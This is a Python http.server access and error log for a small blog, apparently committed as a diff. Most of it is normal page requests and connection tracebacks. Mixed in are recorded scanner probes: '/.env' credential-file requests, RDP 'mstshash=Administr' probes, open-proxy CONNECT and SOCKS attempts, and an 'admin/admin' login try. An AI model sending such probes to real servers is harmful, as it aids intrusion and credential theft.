+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('104.28.245.201', 24878)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+104.28.245.201 - - [09/Apr/2024 19:59:13] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 19:59:14] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:59:14] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:59:15] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:59:16] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:59:19] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 19:59:19] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('167.94.146.53', 58126)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+167.94.146.53 - - [09/Apr/2024 20:16:57] "GET / HTTP/1.1" 200 -
+167.94.146.53 - - [09/Apr/2024 20:17:00] "GET / HTTP/1.1" 200 -
+167.94.146.53 - - [09/Apr/2024 20:17:01] code 505, message Invalid HTTP version (2.0)
+167.94.146.53 - - [09/Apr/2024 20:17:01] "PRI * HTTP/2.0" 505 -
+167.94.146.53 - - [09/Apr/2024 20:17:02] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+167.94.146.53 - - [09/Apr/2024 20:17:02] "GET /favicon-32x32.png HTTP/1.1" 200 -
+167.94.146.53 - - [09/Apr/2024 20:17:03] "GET /favicon-16x16.png HTTP/1.1" 200 -
+167.94.146.53 - - [09/Apr/2024 20:17:05] "GET /favicon.ico HTTP/1.1" 200 -
+175.198.181.131 - - [09/Apr/2024 20:25:58] code 501, message Unsupported method ('CONNECT')
+175.198.181.131 - - [09/Apr/2024 20:25:58] "CONNECT www.naver.com:80 HTTP/1.1" 501 -
+52.167.144.200 - - [09/Apr/2024 20:31:15] "GET /posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%94%B6%E7%BC%A9%E5%BC%95%E6%93%8Eyacy/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 20:42:09] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 20:42:10] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 20:42:10] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.201 - - [09/Apr/2024 20:42:11] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 20:42:12] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 20:42:15] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.200 - - [09/Apr/2024 20:42:15] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+52.167.144.223 - - [09/Apr/2024 21:12:30] "GET /posts/archive-%E7%8E%8B%E5%BD%A6%E5%BD%A6/ HTTP/1.1" 200 -
+115.231.78.10 - - [09/Apr/2024 21:34:37] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+115.231.78.10 - - [09/Apr/2024 21:34:37] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+----------------------------------------
+Exception occurred during processing of request from ('167.94.145.52', 35022)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+167.94.145.52 - - [09/Apr/2024 21:49:53] "GET / HTTP/1.1" 200 -
+167.94.145.52 - - [09/Apr/2024 21:49:56] "GET / HTTP/1.1" 200 -
+167.94.145.52 - - [09/Apr/2024 21:49:56] code 505, message Invalid HTTP version (2.0)
+167.94.145.52 - - [09/Apr/2024 21:49:56] "PRI * HTTP/2.0" 505 -
+167.94.145.52 - - [09/Apr/2024 21:49:57] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+167.94.145.52 - - [09/Apr/2024 21:49:57] "GET /favicon-32x32.png HTTP/1.1" 200 -
+167.94.145.52 - - [09/Apr/2024 21:49:57] "GET /favicon-16x16.png HTTP/1.1" 200 -
+167.94.145.52 - - [09/Apr/2024 21:49:57] "GET /favicon.ico HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('185.4.67.194', 60000)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+118.68.84.13 - - [09/Apr/2024 22:13:31] code 400, message Bad HTTP/0.9 request type ('\x00\x00\x00')
+118.68.84.13 - - [09/Apr/2024 22:13:31] "    c                           " 400 -
+118.68.84.13 - - [09/Apr/2024 22:13:35] code 400, message Bad request syntax ('\xa0\x00\x00`\x00\x00\x00\x00admin\x00\x00\x00admin\x00\x00\x00\x04\x01\x00\x00\x00\x00¡ª')
+118.68.84.13 - - [09/Apr/2024 22:13:35] "   `    admin   admin       ¡ª" 400 -
+47.116.3.48 - - [09/Apr/2024 22:52:50] code 404, message File not found
+47.116.3.48 - - [09/Apr/2024 22:52:50] "GET /.env HTTP/1.1" 404 -
+185.161.248.141 - - [10/Apr/2024 00:49:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.141 - - [10/Apr/2024 00:49:01] "  /*à     Cookie: mstshash=Administr" 400 -
+198.235.24.58 - - [10/Apr/2024 03:05:00] "GET / HTTP/1.1" 200 -
+8.210.164.235 - - [10/Apr/2024 04:20:00] code 404, message File not found
+8.210.164.235 - - [10/Apr/2024 04:20:00] "GET /.env HTTP/1.1" 404 -
+118.114.19.190 - - [10/Apr/2024 05:20:06] "GET / HTTP/1.0" 200 -
+198.199.96.98 - - [10/Apr/2024 05:23:21] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Û\x84à\x8f#²Ï\x00£Îxmø8Ã§\x04czöÉ»\x16b)ým\x8d\x9aíOÂ\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+198.199.96.98 - - [10/Apr/2024 05:23:21] " {  wÛà#²Ï £Îxmø8Ã§czöÉ»b)ýmíOÂ  À/À+ÀÀÀÀ	ÀÀ" 400 -
+----------------------------------------
+Exception occurred during processing of request from ('87.251.64.11', 62788)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+79.124.49.202 - - [10/Apr/2024 05:36:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [10/Apr/2024 05:36:12] "  /*à     Cookie: mstshash=Administr" 400 -
+207.46.13.154 - - [10/Apr/2024 05:40:53] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+40.77.167.14 - - [10/Apr/2024 05:51:01] "GET /posts/archive-%E7%8E%8B%E5%BD%A6%E5%BD%A6/ HTTP/1.1" 200 -
+94.156.71.239 - - [10/Apr/2024 05:54:06] code 501, message Unsupported method ('CONNECT')
+94.156.71.239 - - [10/Apr/2024 05:54:06] "CONNECT 185.65.245.140:7227 HTTP/1.1" 501 -
+40.77.167.10 - - [10/Apr/2024 06:11:01] "GET /resource/%E9%87%91%E9%92%B1%E8%A7%82/ HTTP/1.1" 200 -
+52.167.144.24 - - [10/Apr/2024 09:01:47] "GET /resource/%E6%94%B9%E5%8F%98%E9%97%AE%E9%A2%98%E7%9A%84%E5%BD%A2%E6%88%90%E5%92%8C%E8%A7%A3%E5%86%B3/ HTTP/1.1" 200 -
+103.203.57.20 - - [10/Apr/2024 09:41:26] "GET / HTTP/1.1" 200 -
+207.46.13.107 - - [10/Apr/2024 09:52:51] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+78.128.114.22 - - [10/Apr/2024 11:11:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.128.114.22 - - [10/Apr/2024 11:11:15] "  /*à     Cookie: mstshash=Administr" 400 -
+78.128.114.22 - - [10/Apr/2024 11:38:13] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+78.128.114.22 - - [10/Apr/2024 11:38:13] "  /*à     Cookie: mstshash=Administr" 400 -
+194.26.135.130 - - [10/Apr/2024 11:40:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+194.26.135.130 - - [10/Apr/2024 11:40:06] "  /*à     Cookie: mstshash=Administr" 400 -
+194.26.135.130 - - [10/Apr/2024 12:43:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+194.26.135.130 - - [10/Apr/2024 12:43:19] "  /*à     Cookie: mstshash=Administr" 400 -
+117.50.153.197 - - [10/Apr/2024 13:00:20] "GET / HTTP/1.1" 200 -
+52.167.144.57 - - [10/Apr/2024 13:21:04] code 404, message File not found
+52.167.144.57 - - [10/Apr/2024 13:21:04] "GET /robots.txt HTTP/1.1" 404 -
+157.55.39.7 - - [10/Apr/2024 13:21:17] "GET /resource/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%B4%BB%E5%AD%A6%E4%B9%A0%E5%8D%95%E5%85%83_end/ HTTP/1.1" 200 -
+152.89.198.228 - - [10/Apr/2024 13:48:09] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+152.89.198.228 - - [10/Apr/2024 13:48:09] "  /*à     Cookie: mstshash=Administr" 400 -
+45.128.232.226 - - [10/Apr/2024 14:07:43] code 501, message Unsupported method ('CONNECT')
+45.128.232.226 - - [10/Apr/2024 14:07:43] "CONNECT example.com:443 HTTP/1.1" 501 -
+45.128.232.226 - - [10/Apr/2024 14:07:53] code 400, message Bad request syntax ('\x05\x01\x00')
+45.128.232.226 - - [10/Apr/2024 14:07:53] " " 400 -
+45.128.232.226 - - [10/Apr/2024 14:08:03] code 400, message Bad request version ('ß\x97(')
+45.128.232.226 - - [10/Apr/2024 14:08:03] " ê  æA6K¾üÈîdÖFMåÁÃH|O Ö,TÓ8ëh ß(" 400 -
+----------------------------------------
+Exception occurred during processing of request from ('45.128.232.226', 50154)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+152.89.198.228 - - [10/Apr/2024 14:39:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+152.89.198.228 - - [10/Apr/2024 14:39:04] "  /*à     Cookie: mstshash=Administr" 400 -
+185.161.248.141 - - [10/Apr/2024 14:55:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.141 - - [10/Apr/2024 14:55:38] "  /*à     Cookie: mstshash=Administr" 400 -
+79.124.49.202 - - [10/Apr/2024 15:18:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [10/Apr/2024 15:18:46] "  /*à     Cookie: mstshash=Administr" 400 -
+207.46.13.154 - - [10/Apr/2024 15:19:20] "GET /resource/%E5%BB%B6%E8%BF%9F%E6%BB%A1%E8%B6%B3/ HTTP/1.1" 200 -
+52.167.144.198 - - [10/Apr/2024 15:30:07] "GET /resource/%E8%AE%BE%E8%AE%A1%E4%BA%BA%E7%94%9F-%E7%BA%A0%E5%81%8F/ HTTP/1.1" 200 -
+40.77.167.144 - - [10/Apr/2024 15:38:47] "GET /posts/%E6%92%AD%E5%AE%A2%E8%BD%AC%E8%AF%91%E6%96%B9%E6%B3%95/ HTTP/1.1" 200 -
+40.77.167.76 - - [10/Apr/2024 15:50:39] "GET /resource/vedio/ HTTP/1.1" 200 -
+65.49.20.77 - - [10/Apr/2024 16:06:54] "GET / HTTP/1.1" 200 -
+65.49.20.69 - - [10/Apr/2024 16:07:31] "GET /favicon.ico HTTP/1.1" 200 -
+65.49.20.109 - - [10/Apr/2024 16:07:54] code 404, message File not found
+65.49.20.109 - - [10/Apr/2024 16:07:54] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+65.49.20.77 - - [10/Apr/2024 16:08:15] code 501, message Unsupported method ('CONNECT')
+65.49.20.77 - - [10/Apr/2024 16:08:15] "CONNECT www.shadowserver.org:443 HTTP/1.1" 501 -
+87.246.7.78 - - [10/Apr/2024 16:23:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+87.246.7.78 - - [10/Apr/2024 16:23:07] "  /*à     Cookie: mstshash=Administr" 400 -
+36.232.49.99 - - [10/Apr/2024 17:02:02] "GET / HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:03] "GET /css/reset.css HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:05] "GET /css/smigle.css HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:15] "GET /project/ HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:15] "GET /css/font.css HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:15] "GET /images/wxf.jpg HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:16] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:16] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:24] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+36.232.49.99 - - [10/Apr/2024 17:02:24] "GET /img/2024-04-09012019.jpg HTTP/1.1" 200 -
+47.236.251.7 - - [10/Apr/2024 17:16:06] code 404, message File not found
+47.236.251.7 - - [10/Apr/2024 17:16:06] "GET http://passport.baidu.com/ HTTP/1.1" 404 -
+47.236.251.7 - - [10/Apr/2024 17:16:10] code 400, message Bad request syntax ('\x04\x01\x00Pg)§ê\x00')
+47.236.251.7 - - [10/Apr/2024 17:16:10] " Pg)§ê " 400 -
+47.236.251.7 - - [10/Apr/2024 17:16:27] code 400, message Bad request syntax ('\x05\x01\x00')
+47.236.251.7 - - [10/Apr/2024 17:16:27] " " 400 -
+----------------------------------------
+Exception occurred during processing of request from ('206.168.34.124', 34656)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+206.168.34.124 - - [10/Apr/2024 17:28:40] "GET / HTTP/1.1" 200 -
+206.168.34.124 - - [10/Apr/2024 17:28:43] "GET / HTTP/1.1" 200 -
+206.168.34.124 - - [10/Apr/2024 17:28:44] code 505, message Invalid HTTP version (2.0)
+206.168.34.124 - - [10/Apr/2024 17:28:44] "PRI * HTTP/2.0" 505 -
+206.168.34.124 - - [10/Apr/2024 17:28:44] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+206.168.34.124 - - [10/Apr/2024 17:28:45] "GET /favicon-32x32.png HTTP/1.1" 200 -
+206.168.34.124 - - [10/Apr/2024 17:28:48] "GET /favicon-16x16.png HTTP/1.1" 200 -
+206.168.34.124 - - [10/Apr/2024 17:28:49] "GET /favicon.ico HTTP/1.1" 200 -
+103.172.182.41 - - [10/Apr/2024 18:26:17] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+103.172.182.41 - - [10/Apr/2024 18:26:25] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+103.172.182.41 - - [10/Apr/2024 18:26:29] "GET /favicon-32x32.png HTTP/1.1" 200 -
+103.172.182.41 - - [10/Apr/2024 18:28:18] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 18:48:14] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+104.28.245.200 - - [10/Apr/2024 18:49:24] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 304 -
+178.18.253.119 - - [10/Apr/2024 19:58:54] "GET / HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:24] "GET / HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:27] "GET /css/font.css HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:27] "GET /css/reset.css HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:28] "GET /css/smigle.css HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:28] "GET /images/wxf.jpg HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:28] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:28] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:30] "GET /project/ HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('39.144.7.196', 17730)
+----------------------------------------
+Exception occurred during processing of request from ('39.144.7.196', 17731)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+39.144.7.196 - - [10/Apr/2024 20:46:31] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:31] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:34] "GET /resource/%E6%96%AF%E5%9D%A6%E7%A6%8F%E4%BA%BA%E7%94%9F%E8%AE%BE%E8%AE%A1/ HTTP/1.1" 200 -
+39.144.7.196 - - [10/Apr/2024 20:46:34] "GET /img/2024-04-09012019.jpg HTTP/1.1" 200 -
+79.124.49.214 - - [10/Apr/2024 21:09:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.214 - - [10/Apr/2024 21:09:21] "  /*à     Cookie: mstshash=Administr" 400 -
+220.167.233.191 - - [10/Apr/2024 21:19:35] code 400, message Bad request syntax ('\x04\x01\x00PnòD\x04\x00')
+220.167.233.191 - - [10/Apr/2024 21:19:35] " PnòD " 400 -
+----------------------------------------
+Exception occurred during processing of request from ('87.251.64.11', 62968)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 395, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+104.28.245.201 - - [10/Apr/2024 22:18:18] "GET /resource/list-infostream-src/ HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 22:18:21] "GET /css/font.css HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 22:18:21] "GET /css/reset.css HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 22:18:21] "GET /css/smigle.css HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 22:18:23] "GET /images/wxf.jpg HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 22:18:24] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+104.28.245.201 - - [10/Apr/2024 22:18:25] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+79.124.49.202 - - [10/Apr/2024 22:41:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [10/Apr/2024 22:41:47] "  /*à     Cookie: mstshash=Administr" 400 -
+69.234.243.123 - - [11/Apr/2024 00:53:34] code 400, message Bad request syntax ('&&&&~\x04»8ÅaýT\x07P.VJÃ\x04;\x13\x0600-0C-29-B1-35-79')
+69.234.243.123 - - [11/Apr/2024 00:53:34] "&&&&~»8ÅaýTP.VJÃ;00-0C-29-B1-35-79" 400 -
+69.234.243.123 - - [11/Apr/2024 00:57:24] code 400, message Bad request version ('OÑËÜ®Ëd')
+69.234.243.123 - - [11/Apr/2024 00:57:24] "   TZ         .    I¨À )z» zÚf Ò~Uñi»©                ÃÐ¢|¦v½óOÑËÜ®Ëd" 400 -
+52.83.92.55 - - [11/Apr/2024 01:09:44] code 400, message Bad request syntax ('333766643833656338616434363333643963363962386536653538383937393235613033653338636434')
+52.83.92.55 - - [11/Apr/2024 01:09:44] "333766643833656338616434363333643963363962386536653538383937393235613033653338636434" 400 -
+60.190.226.189 - - [11/Apr/2024 01:21:35] code 501, message Unsupported method ('CONNECT')
+60.190.226.189 - - [11/Apr/2024 01:21:35] "CONNECT www.baidu.com:443 HTTP/1.0" 501 -
